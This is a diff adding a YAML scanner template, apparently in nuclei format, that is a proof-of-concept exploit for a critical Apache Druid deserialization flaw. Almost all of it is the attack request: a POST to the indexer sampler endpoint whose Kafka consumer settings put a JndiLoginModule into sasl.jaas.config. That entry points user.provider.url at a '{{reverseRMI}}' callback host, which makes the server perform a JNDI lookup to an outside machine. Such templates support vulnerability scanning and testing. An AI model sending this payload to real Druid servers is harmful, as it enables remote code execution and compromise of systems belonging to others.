@@ -1,0 +1,34 @@
+id: yaml-poc-apache-druid-deserialization-CT-670759
+info:
+  name: Yaml Poc Apache Druid Deserialization Ct 670759
+  author: yiqing.xu
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-apache-druid-deserialization-CT-670759'
+  tags: apache,deserialization
+  reference: []
+http:
+- method: POST
+  path:
+  - /druid/indexer/v1/sampler?for=connect
+  body: "{\n    \"type\":\"kafka\",\n    \"spec\":{\n        \"type\":\"kafka\",\n\
+    \        \"ioConfig\":{\n            \"type\":\"kafka\",\n            \"consumerProperties\"\
+    :{\n                \"bootstrap.servers\":\"6.6.6.6:9092\",\n                \"\
+    sasl.mechanism\":\"SCRAM-SHA-256\",\n                \"security.protocol\":\"\
+    SASL_SSL\",\n                \"sasl.jaas.config\":\"com.sun.security.auth.module.JndiLoginModule\
+    \ required user.provider.url=\\\"{{reverseRMI}}\\\" useFirstPass=\\\"true\\\"\
+    \ serviceName=\\\"x\\\" debug=\\\"true\\\" group.provider.url=\\\"xxx\\\";\"\n\
+    \            },\n            \"topic\":\"any\",\n            \"useEarliestOffset\"\
+    :true,\n            \"inputFormat\":{\n                \"type\":\"regex\",\n \
+    \               \"pattern\":\"([\\\\s\\\\S]*)\",\n                \"listDelimiter\"\
+    :\"56616469-6de2-9da4-efb8-8f416e6e6965\",\n                \"columns\":[\n  \
+    \                  \"raw\"\n                ]\n            }\n        },\n   \
+    \     \"dataSchema\":{\n            \"dataSource\":\"sample\",\n            \"\
+    timestampSpec\":{\n                \"column\":\"!!!_no_such_column_!!!\",\n  \
+    \              \"missingValue\":\"1970-01-01T00:00:00Z\"\n            },\n   \
+    \         \"dimensionsSpec\":{\n\n            },\n            \"granularitySpec\"\
+    :{\n                \"rollup\":false\n            }\n        },\n        \"tuningConfig\"\
+    :{\n            \"type\":\"kafka\"\n        }\n    },\n    \"samplerConfig\":{\n\
+    \        \"numRows\":500,\n        \"timeoutMs\":15000\n    }\n}"
+  headers:
+    Content-Type: application/json
+  redirects: false
